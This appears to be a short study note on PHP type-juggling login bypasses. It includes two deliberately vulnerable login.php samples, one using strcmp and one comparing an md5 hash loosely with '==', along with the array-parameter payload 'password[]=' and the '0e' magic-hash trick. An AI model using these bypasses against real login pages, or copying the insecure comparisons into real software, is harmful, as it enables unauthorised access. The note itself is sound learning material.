
To avoid some comparative in php. 

---
# In what case we can use this attack?

- We can use in admin panels to avoid the comparative of the password

- When you detect that there are a compare of string, like user with user, password with password

- The vulnerable part is when using the function strcmp to compare.

- Other vulnerabilty is when there are two equals

---

# Example login.php to test

````php
<html>
        <font color="red"><center><h1>Secure Login Page</h1></center></font>
        <hr><br>
        <body style="background-color:powderblue;">
                <center>
                        <form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
                                <label> Usuario: </label>
                                        <input type="text" name="usuario" id="usuario" size="30">
                                <br><br>

                                <label> Password: </label>
                                        <input type="password" name="password" id="password" size="30">

                                <br><br><br>

                                <input type="submit" value="Login">

                        </form>
                </center>

                <?php
                        $USER = "admin";
                        $PASSWORD = 'adm1nP@$$1313_$$sergiky';

                        if(isset($_POST['usuario']) && isset($_POST['password'])) {
                                if($_POST['usuario'] == $USER){
                                        if(strcmp($_POST['password'], $PASSWORD) == 0 ){
                                                echo "[+] Acceso garantizado, bienvenido usuario admin [+]";
                                        } else {
                                                echo "[!] La contraseña proporcionada no es válida [!]";
                                        }
                                } else {
                                        echo "[!] El usuario introducido no es correcto [!]";
                                }

                        }
                ?>

        </body>
</html>
````


---

# How to exploit it

If you open the burpsuite, change the type and indicate that is an array

> usuario=admin&password[]=

----

# Two equals

When there are two equals in a compare

````php
$value1 = 0e087386482136013740957780965295;
$value2 = 0;

if($value1 == $value2) { echo "the values are the same"; } else { echo "The avlue aren't the same" }
````

In this case the output will be "the values are the same", this is because the double equals don't see the type, convert it in types common.

While triple equals check if the **type** is equal

Imagine that you have this code of php:

````php
<html>
	<font color="red"><center><h1>Secure Login Page</h1></center></font>
	<hr><br>
	<body style="background-color:powderblue;">
		<center>
			<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
				<label> Usuario: </label>
					<input type="text" name="usuario" id="usuario" size="30">
				<br><br>

				<label> Password: </label>
					<input type="password" name="password" id="password" size="30">

				<br><br><br>

				<input type="submit" value="Login">

			</form>
		</center>

		<?php
			$USER = "admin";
			$PASSWORD = 0e087386482136013740957780965295;

			if(!empty($_POST['usuario']) && !empty($_POST['password'])) {
				$password_input = $_POST['password'];
				$password_input = md5($password_input);
				if($_POST['usuario'] == $USER){
					if($password_input == $PASSWORD){
						echo "[+] Acceso garantizado, bienvenido usuario admin [+]";
					} else {
						echo "[!] La contraseña proporcionada no es válida [!]";
					}
				} else {
					echo "[!] El usuario introducido no es correcto [!]";
				}

			}
		?>

	</body>
</html>
````

In google you can search by **0e hash collision** to see what other string in md5 begin with 0e.

This other string allow you to authenticate.

---

# Tags

#vulnerabilty #typejuggling 

---


